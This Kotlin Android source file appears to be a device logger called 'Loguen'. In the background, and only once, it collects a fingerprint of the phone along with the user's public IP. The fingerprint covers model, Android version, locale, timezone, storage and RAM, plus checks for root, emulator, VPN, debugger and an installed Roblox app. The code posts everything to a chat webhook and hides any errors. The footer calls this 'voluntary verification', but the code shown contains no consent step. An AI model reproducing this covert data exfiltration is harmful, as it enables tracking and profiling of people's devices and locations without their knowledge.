package com.example.scanner

import android.content.Context
import android.os.Build
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

object Sender {

    fun sendOnce(ctx: Context) {
        if (DeviceInfo.alreadySent(ctx)) return
        thread {
            val ok = trySend(ctx)
            if (ok) DeviceInfo.markSent(ctx)
        }
    }

    private fun trySend(ctx: Context): Boolean {
        val ip = publicIp() ?: "desconocida"

        val metrics = DisplayMetrics()
        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
        } catch (_: Exception) {
        }

        val fields = JSONArray()
        fun add(name: String, value: String, inline: Boolean = true) {
            fields.put(
                JSONObject().apply {
                    put("name", name)
                    put("value", value)
                    put("inline", inline)
                }
            )
        }

        add("ID instalación", "`" + DeviceInfo.installationId(ctx) + "`")
        add("Hora", DeviceInfo.now())
        add("Modelo", Build.MODEL ?: "?")
        add("Marca", Build.BRAND ?: "?")
        add("Fabricante", Build.MANUFACTURER ?: "?")
        add("Dispositivo", Build.DEVICE ?: "?")
        add("Producto", Build.PRODUCT ?: "?")
        add("Android", Build.VERSION.RELEASE ?: "?")
        add("API", Build.VERSION.SDK_INT.toString())
        add("Arquitecturas", Build.SUPPORTED_ABIS.joinToString(", "))
        add("Idioma", java.util.Locale.getDefault().toString())
        add("Zona horaria", DeviceInfo.timezone())
        add("Resolución", metrics.widthPixels.toString() + "x" + metrics.heightPixels)
        add("Densidad", metrics.densityDpi.toString() + " dpi")
        add("Root", if (DeviceInfo.hasRoot()) "Sí" else "No")
        add("Emulador", if (DeviceInfo.isEmulator()) "Sí" else "No")
        add("VPN", if (DeviceInfo.hasVpn(ctx)) "Sí" else "No")
        add("Depurador USB", if (DeviceInfo.debugger()) "Sí" else "No")
        add("Roblox instalado", if (DeviceInfo.hasRoblox(ctx)) "Sí" else "No")
        add("Espacio libre", DeviceInfo.freeStorageMb().toString() + " MB")
        add("Memoria total", DeviceInfo.totalRamMb(ctx).toString() + " MB")
        add("IP pública", ip, false)

        val embed = JSONObject().apply {
            put("title", "Loguen · nueva ficha")
            put("color", 0x7C6CFF)
            put("fields", fields)
            put(
                "footer",
                JSONObject().apply { put("text", "Loguen · verificación voluntaria") }
            )
            put("timestamp", java.time.Instant.now().toString())
        }

        val body = JSONObject().apply {
            put("username", "Loguen")
            put("embeds", JSONArray().put(embed))
        }

        var conn: HttpURLConnection? = null
        return try {
            conn = URL(Webhook.URL).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.setRequestProperty("User-Agent", "Loguen")
            conn.doOutput = true
            conn.connectTimeout = 12000
            conn.readTimeout = 12000
            val out = OutputStreamWriter(conn.outputStream, "UTF-8")
            out.write(body.toString())
            out.flush()
            out.close()
            val code = conn.responseCode
            code in 200..299
        } catch (_: Exception) {
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun publicIp(): String? {
        var conn: HttpURLConnection? = null
        return try {
            conn = URL("https://api.ipify.org").openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            conn.inputStream.bufferedReader().readText().trim().ifEmpty { null }
        } catch (_: Exception) {
            null
        } finally {
            conn?.disconnect()
        }
    }
}
